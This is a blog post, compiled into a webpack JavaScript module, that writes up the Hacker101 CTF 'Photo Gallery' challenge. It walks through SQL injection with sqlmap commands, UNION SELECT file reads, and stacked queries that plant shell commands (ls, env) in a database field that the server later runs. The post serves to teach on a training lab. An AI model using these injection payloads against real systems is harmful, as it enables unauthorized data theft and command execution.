exports.ids = [7];
exports.modules = {

/***/ "./md/blog/hacker101-ctf-photo-gallery.md":
/*!************************************************!*\
  !*** ./md/blog/hacker101-ctf-photo-gallery.md ***!
  \************************************************/
/*! exports provided: default */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
eval("__webpack_require__.r(__webpack_exports__);\n/* harmony default export */ __webpack_exports__[\"default\"] = (\"---\\ntitle: Hacker101 CTF Photo Gallery writeup\\ndescription: A write up for the Photo Gallery [moderae] challenge\\npublished: true\\ndatePublished: 1609676431536\\nauthor: lwlx\\nauthorTwitter: \\\"0x0000005\\\"\\nauthorPhoto: /profile.jpg\\ntags:\\n  - ctf\\n  - writeup\\n  - hackerone\\n  - hacker101\\n  - security\\nthumbnailPhoto: /hackerone/hackerone.png\\nbannerPhoto: /hackerone/hackerone.png\\ncanonicalUrl:\\n---\\n\\n# Photo Gallery _[moderate]_\\n\\nThis is my Write Up for the \\\"Photo Gallery\\\" challenge of HackerOne's CTF.\\n\\nAs usual we get a link to webpage, it seems to be an image gallery, but one of the images is broken.\\nThe missing one is called `Invisible`, so lets look into that.\\n\\n```\\nhttp://34.74.105.127/ad3e8c7df9/\\n```\\n\\n![initial page](/hackerone/photogallery-start.png \\\"initial page\\\")\\n\\n## Information gathering\\n\\nwith Burp we were able to find that the server returns no content for this image.\\nimages are loaded with a `GET` Request to the server like so:\\n\\n`GET /ad3e8c7df9/fetch?id=1 HTTP/1.1`\\n\\nthis also aligns with the first tip we are provided:\\n\\n> Hint 1: _Consider how you might build this system yourself. What would the **query for fetch** look like?_\\n\\nnaturally we start fuzzing the `id` parameter.\\n\\n```python\\nGET /ad3e8c7df9/fetch?id=4 HTTP/1.1 # 404\\nGET /ad3e8c7df9/fetch?id=0 HTTP/1.1 # 404\\nGET /ad3e8c7df9/fetch?id=-1 HTTP/1.1 # 500\\n```\\n\\nalright, no quick wins, so let's give it a try with fizzing using sqlmap.\\nQuickly we are able to see that the server seems to be vulnerable to some attack.\\n\\n```python\\nsqlmap -u \\\"http://34.74.105.127/ad3e8c7df9/fetch?id=2\\\"\\n```\\n\\nThis command runs for quite a while and will try to find vulnerabilities in the fetch endpoint.\\nwhen we are done we should know what to do next.\\n\\n## Gathered Data\\n\\n### sqlmap identified the following injection point(s) with a total of 311 HTTP(s) requests:\\n\\n```python\\nParameter: id (GET)\\nType: boolean-based blind\\nTitle: AND boolean-based blind - WHERE or HAVING clause\\nPayload: id=2 AND 3567=3567\\n\\nType: time-based blind\\nTitle: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\\nPayload: id=2 AND (SELECT 8480 FROM (SELECT(SLEEP(5)))KHRS)\\n```\\n\\n```python\\n[21:44:44] [INFO] the back-end DBMS is MySQL\\nweb server operating system: Linux Ubuntu\\nweb application technology: Nginx 1.14.0\\nback-end DBMS: MySQL >= 5.0.12 (MariaDB fork)\\n```\\n\\n### Our Target Server:\\n\\n    | Type      | Service      | Version                  | Vulnerable?    |\\n    | --------- | ------------ | ------------------------ | -------------- |\\n    | OS        | Linux Ubuntu | ??                       | not focused    |\\n    | Webserver | Nginx        | 1.14.0                   | no             |\\n    | Database  | MySQL        | >= 5.0.12 (MariaDB fork) | yes (id param) |\\n\\nGood, we got something, we know the server is vulnerable to multiple vulnerabilities such as a 'boolean base blind'. We also found the Webserver is Nginx v1.14.0, which sadly has no usable vulnerabilities here. But with us now knowing the exact os and DB System used lets run sqlmap again with that info and see what we get.\\n\\n```python\\nsqlmap -u \\\"http://34.74.105.127/ad3e8c7df9/fetch?id=2\\\" -f --os=linux --dbms=mysql --level=3 -o\\n```\\n\\nwe dont really get any more useful information from here.\\nsoo.. were kinda stuck lets just get another hint then:\\n\\n> Hint 2: _Take a few minutes to consider the **state of the union**_\\n\\nThe state uf the union? are they hinting on using UNION statements in the query?\\n_The UNION operator is used to combine the result-set of two or more SELECT statements._\\nThat seems like somethng we can make use of, so lets try and combine our query statements f.e. like this:\\n\\n`http://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT 'something'`\\n\\nbut what do we look for? Lets get another hint.\\n\\n> Hint 3: _This application runs on the **uwsgi-nginx-flask-docker** image_\\n\\nuwsgi-nginx? hmm havent heard of that, but sems to be some kind of portable all in one flask. lets look for the docs.\\n\\nhttps://uwsgi-docs.readthedocs.io/en/latest/Configuration.html#ini-files\\n\\n> uWSGI can be configured using several different methods.\\n\\nYAML, JSON, INI are some supported formats -> ini beeing the defualt so lets try getting the 'uwsgi.ini' file?\\n\\n![union select wiht burp repeater](/hackerone/union-select-ini.png \\\"union select wiht burp repeater\\\")\\n\\nthis returns us some configdata pointing to module main which is the entrypoint.\\n\\n```python\\n[uwsgi]\\nmodule = main\\ncallable = app\\n```\\n\\nso lets see if we can also fethc the main.py\\n\\n```python\\nhttp://35.190.155.168/c947e97f6e/fetch?id=4%20UNION%20SELECT%20%27main.py%27--\\n```\\n\\nHere we get lots of infos our **first FLAG** and the db connection settings:\\n\\n### FLAG 0:\\n\\n```python\\n%s\\n' % (pid, sanitize(ptitle)) fns.append(pfn) rep += 'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\\\\n', 1)[-1] + '' rep += '\\n\\\\n' return home.replace('$ALBUMS$', rep) @app.route('/fetch') def fetch(): cur = getDb().cursor() if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0: abort(404)\\n# It's dangerous to go alone, take this: # ^FLAG^9e6d57c394c129??????????????????????????????f74dbf2faa0abd571b32c7$FLAG$ return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() if __name__ == \\\"__main__\\\": app.run(host='0.0.0.0', port=80)\\n```\\n\\n`return MySQLdb.connect(host=\\\"localhost\\\", user=\\\"root\\\", password=\\\"\\\", db=\\\"level5\\\")`\\n\\nwe also see that they are using the photos table\\n\\n`cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))`\\n\\nlets try to fuzz that with sqlmap, since we now know the DB and tables info we can launch a targeted attack.\\n\\n```python\\nsqlmap -u \\\"http://34.74.105.127/ad3e8c7df9/fetch?id=1\\\" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 2\\n```\\n\\nThis can take quite a while.. for me it crashed after 40 minutes, so i gave it another go with just focusing on the column `filename` since, here is the value we need.we do this by adding the -C parameter, i also increased the thradcount to 4 to try and get faster results. I also changed the url to contain id=3 since this is the id we want to get the info from.\\n\\n```python\\nsqlmap -u \\\"http://35.190.155.168/c947e97f6e/fetch?id=3\\\" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 4 -C filename\\n```\\n\\nThis means that sqlmap will start with the filename of id=3 which is exactly what we want right now.\\n\\n![starts to query filename of id 3](/hackerone/photo-gallery-hash.png \\\"query on the filename of id 3\\\")\\nSo lets have a look at our results:\\n\\n```python\\nDatabase: level5\\nTable: photos\\n[3 entries]\\n+------------------------------------------------------------------+\\n| filename |\\n+------------------------------------------------------------------+\\n| 9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa |\\n| files/adorable.jpg |\\n| files/purrfect.jpg |\\n+------------------------------------------------------------------+\\n```\\n\\n> you might be getting partial values like so:\\n> `9ef8fc5di15625db993f1c8e120beafc6873d801a804670?????????????????`\\n> you should be able to re-run sqlmap to find the missing characters\\n> `9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa`\\n\\ndecrypted: `\\\\*||+ls+-a+tmp.txt`\\nanother file! nice lets try and get that with a UNION STATEMENT request like so:\\n\\n`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'tmp.txt'-- HTTP/1.1`\\nhmm no luck it seems... let's do it another way.\\n\\nFrom our previous findings we know that files are in the 'files' directory and that we can run sql statements on the id param. So we want to try to move the file or its contents so we can access it. We also got a new hint of using ls output to find temp file.\\n\\nWe want to run following statements via the vulnerable param:\\n\\n#### ls in the /files directory and store data in bigWin.txt\\n\\n`update photos set filename='* || ls ./files >bigWin.txt ' where id=3; commit;`\\n\\n`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\\\\*%20||%20ls%20./files%20%3EbigWin.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1`\\n\\n#### store all env data in bigWin.txt (because so often flags are here)\\n\\n`update photos set filename='* || env >bigWin.txt' where id=3; commit;`\\n\\n`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename%3D%27*%20%7C%7C%20env%20%3Etmp.txt%27%20where%20id%3D3%3B%20commit%3B%20-- HTTP/1.1`\\n\\nafter you succsessfully ran those you should be able to run the union select again to get ahold of bigWin.txt!\\n\\n`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'bigWin.txt'-- HTTP/1.1`\\n\\nTadaa!! we got it all.\\n\\n```bash\\n\\\"^FLAG^9ef8fc5da15????????????????????????????????????????????782ca11fa$FLAG$\\\"\\n\\\"^FLAG^63a407d0083????????????????????????????????????????????4564ee9f2$FLAG$\\\"\\nHOSTNAME=ad3e8c7df92d\\nSHLVL=0\\n```\\n\");//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8vLi9tZC9ibG9nL2hhY2tlcjEwMS1jdGYtcGhvdG8tZ2FsbGVyeS5tZD84ZGNiIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBO0FBQWUsOGpRQUErL1AsUUFBUSxpQ0FBaUMsb0dBQW9HLFVBQVUsNEpBQTRKLFFBQVEsaUNBQWlDLGdpQkFBZ2lCIiwiZmlsZSI6Ii4vbWQvYmxvZy9oYWNrZXIxMDEtY3RmLXBob3RvLWdhbGxlcnkubWQuanMiLCJzb3VyY2VzQ29udGVudCI6WyJleHBvcnQgZGVmYXVsdCBcIi0tLVxcbnRpdGxlOiBIYWNrZXIxMDEgQ1RGIFBob3RvIEdhbGxlcnkgd3JpdGV1cFxcbmRlc2NyaXB0aW9uOiBBIHdyaXRlIHVwIGZvciB0aGUgUGhvdG8gR2FsbGVyeSBbbW9kZXJhZV0gY2hhbGxlbmdlXFxucHVibGlzaGVkOiB0cnVlXFxuZGF0ZVB1Ymxpc2hlZDogMTYwOTY3NjQzMTUzNlxcbmF1dGhvcjogbHdseFxcbmF1dGhvclR3aXR0ZXI6IFxcXCIweDAwMDAwMDVcXFwiXFxuYXV0aG9yUGhvdG86IC9wcm9maWxlLmpwZ1xcbnRhZ3M6XFxuICAtIGN0ZlxcbiAgLSB3cml0ZXVwXFxuICAtIGhhY2tlcm9uZVxcbiAgLSBoYWNrZXIxMDFcXG4gIC0gc2VjdXJpdHlcXG50aHVtYm5haWxQaG90bzogL2hhY2tlcm9uZS9oYWNrZXJvbmUucG5nXFxuYmFubmVyUGhvdG86IC9oYWNrZXJvbmUvaGFja2Vyb25lLnBuZ1xcbmNhbm9uaWNhbFVybDpcXG4tLS1cXG5cXG4jIFBob3RvIEdhbGxlcnkgX1ttb2RlcmF0ZV1fXFxuXFxuVGhpcyBpcyBteSBXcml0ZSBVcCBmb3IgdGhlIFxcXCJQaG90byBHYWxsZXJ5XFxcIiBjaGFsbGVuZ2Ugb2YgSGFja2VyT25lJ3MgQ1RGLlxcblxcbkFzIHVzdWFsIHdlIGdldCBhIGxpbmsgdG8gd2VicGFnZSwgaXQgc2VlbXMgdG8gYmUgYW4gaW1hZ2UgZ2FsbGVyeSwgYnV0IG9uZSBvZiB0aGUgaW1hZ2VzIGlzIGJyb2tlbi5cXG5UaGUgbWlzc2luZyBvbmUgaXMgY2FsbGVkIGBJbnZpc2libGVgLCBzbyBsZXRzIGxvb2sgaW50byB0aGF0LlxcblxcbmBgYFxcbmh0dHA6Ly8zNC43NC4xMDUuMTI3L2FkM2U4YzdkZjkvXFxuYGBgXFxuXFxuIVtpbml0aWFsIHBhZ2VdKC9oYWNrZXJvbmUvcGhvdG9nYWxsZXJ5LXN0YXJ0LnBuZyBcXFwiaW5pdGlhbCBwYWdlXFxcIilcXG5cXG4jIyBJbmZvcm1hdGlvbiBnYXRoZXJpbmdcXG5cXG53aXRoIEJ1cnAgd2Ugd2VyZSBhYmxlIHRvIGZpbmQgdGhhdCB0aGUgc2VydmVyIHJldHVybnMgbm8gY29udGVudCBmb3IgdGhpcyBpbWFnZS5cXG5pbWFnZXMgYXJlIGxvYWRlZCB3aXRoIGEgYEdFVGAgUmVxdWVzdCB0byB0aGUgc2VydmVyIGxpa2Ugc286XFxuXFxuYEdFVCAvYWQzZThjN2RmOS9mZXRjaD9pZD0xIEhUVFAvMS4xYFxcblxcbnRoaXMgYWxzbyBhbGlnbnMgd2l0aCB0aGUgZmlyc3QgdGlwIHdlIGFyZSBwcm92aWRlZDpcXG5cXG4+IEhpbnQgMTogX0NvbnNpZGVyIGhvdyB5b3UgbWlnaHQgYnVpbGQgdGhpcyBzeXN0ZW0geW91cnNlbGYuIFdoYXQgd291bGQgdGhlICoqcXVlcnkgZm9yIGZldGNoKiogbG9vayBsaWtlP19cXG5cXG5uYXR1cmFsbHkgd2Ugc3RhcnQgZnV6emluZyB0aGUgYGlkYCBwYXJhbWV0ZXIuXFxuXFxuYGBgcHl0aG9uXFxuR0VUIC9hZDNlOGM3ZGY5L2ZldGNoP2lkPTQgSFRUUC8xLjEgIyA0MDRcXG5HRVQgL2FkM2U4YzdkZjkvZmV0Y2g/aWQ9MCBIVFRQLzEuMSAjIDQwNFxcbkdFVCAvYWQzZThjN2RmOS9mZXRjaD9pZD0tMSBIVFRQLzEuMSAjIDUwMFxcbmBgYFxcblxcbmFscmlnaHQsIG5vIHF1aWNrIHdpbnMsIHNvIGxldCdzIGdpdmUgaXQgYSB0cnkgd2l0aCBmaXp6aW5nIHVzaW5nIHNxbG1hcC5cXG5RdWlja2x5IHdlIGFyZSBhYmxlIHRvIHNlZSB0aGF0IHRoZSBzZXJ2ZXIgc2VlbXMgdG8gYmUgdnVsbmVyYWJsZSB0byBzb21lIGF0dGFjay5cXG5cXG5gYGBweXRob25cXG5zcWxtYXAgLXUgXFxcImh0dHA6Ly8zNC43NC4xMDUuMTI3L2FkM2U4YzdkZjkvZmV0Y2g/aWQ9MlxcXCJcXG5gYGBcXG5cXG5UaGlzIGNvbW1hbmQgcnVucyBmb3IgcXVpdGUgYSB3aGlsZSBhbmQgd2lsbCB0cnkgdG8gZmluZCB2dWxuZXJhYmlsaXRpZXMgaW4gdGhlIGZldGNoIGVuZHBvaW50LlxcbndoZW4gd2UgYXJlIGRvbmUgd2Ugc2hvdWxkIGtub3cgd2hhdCB0byBkbyBuZXh0LlxcblxcbiMjIEdhdGhlcmVkIERhdGFcXG5cXG4jIyMgc3FsbWFwIGlkZW50aWZpZWQgdGhlIGZvbGxvd2luZyBpbmplY3Rpb24gcG9pbnQocykgd2l0aCBhIHRvdGFsIG9mIDMxMSBIVFRQKHMpIHJlcXVlc3RzOlxcblxcbmBgYHB5dGhvblxcblBhcmFtZXRlcjogaWQgKEdFVClcXG5UeXBlOiBib29sZWFuLWJhc2VkIGJsaW5kXFxuVGl0bGU6IEFORCBib29sZWFuLWJhc2VkIGJsaW5kIC0gV0hFUkUgb3IgSEFWSU5HIGNsYXVzZVxcblBheWxvYWQ6IGlkPTIgQU5EIDM1Njc9MzU2N1xcblxcblR5cGU6IHRpbWUtYmFzZWQgYmxpbmRcXG5UaXRsZTogTXlTUUwgPj0gNS4wLjEyIEFORCB0aW1lLWJhc2VkIGJsaW5kIChxdWVyeSBTTEVFUClcXG5QYXlsb2FkOiBpZD0yIEFORCAoU0VMRUNUIDg0ODAgRlJPTSAoU0VMRUNUKFNMRUVQKDUpKSlLSFJTKVxcbmBgYFxcblxcbmBgYHB5dGhvblxcblsyMTo0NDo0NF0gW0lORk9dIHRoZSBiYWNrLWVuZCBEQk1TIGlzIE15U1FMXFxud2ViIHNlcnZlciBvcGVyYXRpbmcgc3lzdGVtOiBMaW51eCBVYnVudHVcXG53ZWIgYXBwbGljYXRpb24gdGVjaG5vbG9neTogTmdpbnggMS4xNC4wXFxuYmFjay1lbmQgREJNUzogTXlTUUwgPj0gNS4wLjEyIChNYXJpYURCIGZvcmspXFxuYGBgXFxuXFxuIyMjIE91ciBUYXJnZXQgU2VydmVyOlxcblxcbiAgICB8IFR5cGUgICAgICB8IFNlcnZpY2UgICAgICB8IFZlcnNpb24gICAgICAgICAgICAgICAgICB8IFZ1bG5lcmFibGU/ICAgIHxcXG4gICAgfCAtLS0tLS0tLS0gfCAtLS0tLS0tLS0tLS0gfCAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gfCAtLS0tLS0tLS0tLS0tLSB8XFxuICAgIHwgT1MgICAgICAgIHwgTGludXggVWJ1bnR1IHwgPz8gICAgICAgICAgICAgICAgICAgICAgIHwgbm90IGZvY3VzZWQgICAgfFxcbiAgICB8IFdlYnNlcnZlciB8IE5naW54ICAgICAgICB8IDEuMTQuMCAgICAgICAgICAgICAgICAgICB8IG5vICAgICAgICAgICAgIHxcXG4gICAgfCBEYXRhYmFzZSAgfCBNeVNRTCAgICAgICAgfCA+PSA1LjAuMTIgKE1hcmlhREIgZm9yaykgfCB5ZXMgKGlkIHBhcmFtKSB8XFxuXFxuR29vZCwgd2UgZ290IHNvbWV0aGluZywgd2Uga25vdyB0aGUgc2VydmVyIGlzIHZ1bG5lcmFibGUgdG8gbXVsdGlwbGUgdnVsbmVyYWJpbGl0aWVzIHN1Y2ggYXMgYSAnYm9vbGVhbiBiYXNlIGJsaW5kJy4gV2UgYWxzbyBmb3VuZCB0aGUgV2Vic2VydmVyIGlzIE5naW54IHYxLjE0LjAsIHdoaWNoIHNhZGx5IGhhcyBubyB1c2FibGUgdnVsbmVyYWJpbGl0aWVzIGhlcmUuIEJ1dCB3aXRoIHVzIG5vdyBrbm93aW5nIHRoZSBleGFjdCBvcyBhbmQgREIgU3lzdGVtIHVzZWQgbGV0cyBydW4gc3FsbWFwIGFnYWluIHdpdGggdGhhdCBpbmZvIGFuZCBzZWUgd2hhdCB3ZSBnZXQuXFxuXFxuYGBgcHl0aG9uXFxuc3FsbWFwIC11IFxcXCJodHRwOi8vMzQuNzQuMTA1LjEyNy9hZDNlOGM3ZGY5L2ZldGNoP2lkPTJcXFwiIC1mIC0tb3M9bGludXggLS1kYm1zPW15c3FsIC0tbGV2ZWw9MyAtb1xcbmBgYFxcblxcbndlIGRvbnQgcmVhbGx5IGdldCBhbnkgbW9yZSB1c2VmdWwgaW5mb3JtYXRpb24gZnJvbSBoZXJlLlxcbnNvby4uIHdlcmUga2luZGEgc3R1Y2sgbGV0cyBqdXN0IGdldCBhbm90aGVyIGhpbnQgdGhlbjpcXG5cXG4+IEhpbnQgMjogX1Rha2UgYSBmZXcgbWludXRlcyB0byBjb25zaWRlciB0aGUgKipzdGF0ZSBvZiB0aGUgdW5pb24qKl9cXG5cXG5UaGUgc3RhdGUgdWYgdGhlIHVuaW9uPyBhcmUgdGhleSBoaW50aW5nIG9uIHVzaW5nIFVOSU9OIHN0YXRlbWVudHMgaW4gdGhlIHF1ZXJ5P1xcbl9UaGUgVU5JT04gb3BlcmF0b3IgaXMgdXNlZCB0byBjb21iaW5lIHRoZSByZXN1bHQtc2V0IG9mIHR3byBvciBtb3JlIFNFTEVDVCBzdGF0ZW1lbnRzLl9cXG5UaGF0IHNlZW1zIGxpa2Ugc29tZXRobmcgd2UgY2FuIG1ha2UgdXNlIG9mLCBzbyBsZXRzIHRyeSBhbmQgY29tYmluZSBvdXIgcXVlcnkgc3RhdGVtZW50cyBmLmUuIGxpa2UgdGhpczpcXG5cXG5gaHR0cDovLzM0Ljc0LjEwNS4xMjcvYWQzZThjN2RmOS9mZXRjaD9pZD0yIFVOSU9OIFNFTEVDVCAnc29tZXRoaW5nJ2BcXG5cXG5idXQgd2hhdCBkbyB3ZSBsb29rIGZvcj8gTGV0cyBnZXQgYW5vdGhlciBoaW50Llxcblxcbj4gSGludCAzOiBfVGhpcyBhcHBsaWNhdGlvbiBydW5zIG9uIHRoZSAqKnV3c2dpLW5naW54LWZsYXNrLWRvY2tlcioqIGltYWdlX1xcblxcbnV3c2dpLW5naW54PyBobW0gaGF2ZW50IGhlYXJkIG9mIHRoYXQsIGJ1dCBzZW1zIHRvIGJlIHNvbWUga2luZCBvZiBwb3J0YWJsZSBhbGwgaW4gb25lIGZsYXNrLiBsZXRzIGxvb2sgZm9yIHRoZSBkb2NzLlxcblxcbmh0dHBzOi8vdXdzZ2ktZG9jcy5yZWFkdGhlZG9jcy5pby9lbi9sYXRlc3QvQ29uZmlndXJhdGlvbi5odG1sI2luaS1maWxlc1xcblxcbj4gdVdTR0kgY2FuIGJlIGNvbmZpZ3VyZWQgdXNpbmcgc2V2ZXJhbCBkaWZmZXJlbnQgbWV0aG9kcy5cXG5cXG5ZQU1MLCBKU09OLCBJTkkgYXJlIHNvbWUgc3VwcG9ydGVkIGZvcm1hdHMgLT4gaW5pIGJlZWluZyB0aGUgZGVmdWFsdCBzbyBsZXRzIHRyeSBnZXR0aW5nIHRoZSAndXdzZ2kuaW5pJyBmaWxlP1xcblxcbiFbdW5pb24gc2VsZWN0IHdpaHQgYnVycCByZXBlYXRlcl0oL2hhY2tlcm9uZS91bmlvbi1zZWxlY3QtaW5pLnBuZyBcXFwidW5pb24gc2VsZWN0IHdpaHQgYnVycCByZXBlYXRlclxcXCIpXFxuXFxudGhpcyByZXR1cm5zIHVzIHNvbWUgY29uZmlnZGF0YSBwb2ludGluZyB0byBtb2R1bGUgbWFpbiB3aGljaCBpcyB0aGUgZW50cnlwb2ludC5cXG5cXG5gYGBweXRob25cXG5bdXdzZ2ldXFxubW9kdWxlID0gbWFpblxcbmNhbGxhYmxlID0gYXBwXFxuYGBgXFxuXFxuc28gbGV0cyBzZWUgaWYgd2UgY2FuIGFsc28gZmV0aGMgdGhlIG1haW4ucHlcXG5cXG5gYGBweXRob25cXG5odHRwOi8vMzUuMTkwLjE1NS4xNjgvYzk0N2U5N2Y2ZS9mZXRjaD9pZD00JTIwVU5JT04lMjBTRUxFQ1QlMjAlMjdtYWluLnB5JTI3LS1cXG5gYGBcXG5cXG5IZXJlIHdlIGdldCBsb3RzIG9mIGluZm9zIG91ciAqKmZpcnN0IEZMQUcqKiBhbmQgdGhlIGRiIGNvbm5lY3Rpb24gc2V0dGluZ3M6XFxuXFxuIyMjIEZMQUcgMDpcXG5cXG5gYGBweXRob25cXG4lc1xcbicgJSAocGlkLCBzYW5pdGl6ZShwdGl0bGUpKSBmbnMuYXBwZW5kKHBmbikgcmVwICs9ICdTcGFjZSB1c2VkOiAnICsgc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoJ2R1IC1jaCAlcyB8fCBleGl0IDAnICUgJyAnLmpvaW4oJ2ZpbGVzLycgKyBmbiBmb3IgZm4gaW4gZm5zKSwgc2hlbGw9VHJ1ZSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKS5zdHJpcCgpLnJzcGxpdCgnXFxcXG4nLCAxKVstMV0gKyAnJyByZXAgKz0gJ1xcblxcXFxuJyByZXR1cm4gaG9tZS5yZXBsYWNlKCckQUxCVU1TJCcsIHJlcCkgQGFwcC5yb3V0ZSgnL2ZldGNoJykgZGVmIGZldGNoKCk6IGN1ciA9IGdldERiKCkuY3Vyc29yKCkgaWYgY3VyLmV4ZWN1dGUoJ1NFTEVDVCBmaWxlbmFtZSBGUk9NIHBob3RvcyBXSEVSRSBpZD0lcycgJSByZXF1ZXN0LmFyZ3NbJ2lkJ10pID09IDA6IGFib3J0KDQwNClcXG4jIEl0J3MgZGFuZ2Vyb3VzIHRvIGdvIGFsb25lLCB0YWtlIHRoaXM6ICMgXkZMQUdeOWU2ZDU3YzM5NGMxMjk/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz8/Pz9mNzRkYmYyZmFhMGFiZDU3MWIzMmM3JEZMQUckIHJldHVybiBmaWxlKCcuLyVzJyAlIGN1ci5mZXRjaG9uZSgpWzBdLnJlcGxhY2UoJy4uJywgJycpLCAncmInKS5yZWFkKCkgaWYgX19uYW1lX18gPT0gXFxcIl9fbWFpbl9fXFxcIjogYXBwLnJ1bihob3N0PScwLjAuMC4wJywgcG9ydD04MClcXG5gYGBcXG5cXG5gcmV0dXJuIE15U1FMZGIuY29ubmVjdChob3N0PVxcXCJsb2NhbGhvc3RcXFwiLCB1c2VyPVxcXCJyb290XFxcIiwgcGFzc3dvcmQ9XFxcIlxcXCIsIGRiPVxcXCJsZXZlbDVcXFwiKWBcXG5cXG53ZSBhbHNvIHNlZSB0aGF0IHRoZXkgYXJlIHVzaW5nIHRoZSBwaG90b3MgdGFibGVcXG5cXG5gY3VyLmV4ZWN1dGUoJ1NFTEVDVCBpZCwgdGl0bGUsIGZpbGVuYW1lIEZST00gcGhvdG9zIFdIRVJFIHBhcmVudD0lcyBMSU1JVCAzJywgKGlkLCApKWBcXG5cXG5sZXRzIHRyeSB0byBmdXp6IHRoYXQgd2l0aCBzcWxtYXAsIHNpbmNlIHdlIG5vdyBrbm93IHRoZSBEQiBhbmQgdGFibGVzIGluZm8gd2UgY2FuIGxhdW5jaCBhIHRhcmdldGVkIGF0dGFjay5cXG5cXG5gYGBweXRob25cXG5zcWxtYXAgLXUgXFxcImh0dHA6Ly8zNC43NC4xMDUuMTI3L2FkM2U4YzdkZjkvZmV0Y2g/aWQ9MVxcXCIgLS1tZXRob2Q9R0VUIC0tZHVtcCAtRCBsZXZlbDUgLVQgcGhvdG9zIC1wIGlkLCAtLWNvZGU9MjAwIC0taWdub3JlLWNvZGU9NTAwIC0tc2tpcC13YWYgLW8gLS10aHJlYWRzIDJcXG5gYGBcXG5cXG5UaGlzIGNhbiB0YWtlIHF1aXRlIGEgd2hpbGUuLiBmb3IgbWUgaXQgY3Jhc2hlZCBhZnRlciA0MCBtaW51dGVzLCBzbyBpIGdhdmUgaXQgYW5vdGhlciBnbyB3aXRoIGp1c3QgZm9jdXNpbmcgb24gdGhlIGNvbHVtbiBgZmlsZW5hbWVgIHNpbmNlLCBoZXJlIGlzIHRoZSB2YWx1ZSB3ZSBuZWVkLndlIGRvIHRoaXMgYnkgYWRkaW5nIHRoZSAtQyBwYXJhbWV0ZXIsIGkgYWxzbyBpbmNyZWFzZWQgdGhlIHRocmFkY291bnQgdG8gNCB0byB0cnkgYW5kIGdldCBmYXN0ZXIgcmVzdWx0cy4gSSBhbHNvIGNoYW5nZWQgdGhlIHVybCB0byBjb250YWluIGlkPTMgc2luY2UgdGhpcyBpcyB0aGUgaWQgd2Ugd2FudCB0byBnZXQgdGhlIGluZm8gZnJvbS5cXG5cXG5gYGBweXRob25cXG5zcWxtYXAgLXUgXFxcImh0dHA6Ly8zNS4xOTAuMTU1LjE2OC9jOTQ3ZTk3ZjZlL2ZldGNoP2lkPTNcXFwiIC0tbWV0aG9kPUdFVCAtLWR1bXAgLUQgbGV2ZWw1IC1UIHBob3RvcyAtcCBpZCwgLS1jb2RlPTIwMCAtLWlnbm9yZS1jb2RlPTUwMCAtLXNraXAtd2FmIC1vIC0tdGhyZWFkcyA0IC1DIGZpbGVuYW1lXFxuYGBgXFxuXFxuVGhpcyBtZWFucyB0aGF0IHNxbG1hcCB3aWxsIHN0YXJ0IHdpdGggdGhlIGZpbGVuYW1lIG9mIGlkPTMgd2hpY2ggaXMgZXhhY3RseSB3aGF0IHdlIHdhbnQgcmlnaHQgbm93LlxcblxcbiFbc3RhcnRzIHRvIHF1ZXJ5IGZpbGVuYW1lIG9mIGlkIDNdKC9oYWNrZXJvbmUvcGhvdG8tZ2FsbGVyeS1oYXNoLnBuZyBcXFwicXVlcnkgb24gdGhlIGZpbGVuYW1lIG9mIGlkIDNcXFwiKVxcblNvIGxldHMgaGF2ZSBhIGxvb2sgYXQgb3VyIHJlc3VsdHM6XFxuXFxuYGBgcHl0aG9uXFxuRGF0YWJhc2U6IGxldmVsNVxcblRhYmxlOiBwaG90b3NcXG5bMyBlbnRyaWVzXVxcbistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rXFxufCBmaWxlbmFtZSB8XFxuKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLStcXG58IDllZjhmYzVkYTE1NjI1ZGI5OTNmMWM4ZTEyMGJlYWZjNjg3M2Q4MDFhODA0NjcwYjk0OTdlY2M3ODJjYTExZmEgfFxcbnwgZmlsZXMvYWRvcmFibGUuanBnIHxcXG58IGZpbGVzL3B1cnJmZWN0LmpwZyB8XFxuKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLStcXG5gYGBcXG5cXG4+IHlvdSBtaWdodCBiZSBnZXR0aW5nIHBhcnRpYWwgdmFsdWVzIGxpa2Ugc286XFxuPiBgOWVmOGZjNWRpMTU2MjVkYjk5M2YxYzhlMTIwYmVhZmM2ODczZDgwMWE4MDQ2NzA/Pz8/Pz8/Pz8/Pz8/Pz8/P2BcXG4+IHlvdSBzaG91bGQgYmUgYWJsZSB0byByZS1ydW4gc3FsbWFwIHRvIGZpbmQgdGhlIG1pc3NpbmcgY2hhcmFjdGVyc1xcbj4gYDllZjhmYzVkYTE1NjI1ZGI5OTNmMWM4ZTEyMGJlYWZjNjg3M2Q4